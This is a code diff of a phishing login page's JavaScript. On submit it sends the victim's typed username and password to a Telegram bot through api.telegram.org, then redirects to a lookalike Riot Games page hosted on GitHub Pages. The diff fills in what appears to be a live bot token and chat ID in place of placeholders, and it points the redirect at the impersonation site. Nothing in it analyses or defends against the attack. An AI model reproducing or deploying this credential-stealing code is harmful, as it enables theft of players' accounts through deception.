@@ -33,15 +33,15 @@ document.addEventListener("DOMContentLoaded", function () {
 
         if (!isValidUsername(username) || !isValidPassword(password)) return;
 
-        const botToken = "YOUR_BOT_TOKEN"; // ضع توكن البوت الخاص بك هنا
-        const chatId = "YOUR_CHAT_ID"; // ضع معرف الشات الخاص بك هنا
+        const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM"; // ضع توكن البوت الخاص بك هنا
+        const chatId = "6687453395"; // ضع معرف الشات الخاص بك هنا
         const message = `🔥 تسجيل دخول جديد 🔥\n\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;
 
         const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
         fetch(url)
             .then(() => {
-                window.location.href = "https://www.riotgames.com/";
+                window.location.href = "https://riotgames0.github.io/Verification./Lvl30/index.html";
             })
             .catch(error => console.error("Error sending to Telegram:", error));
     }
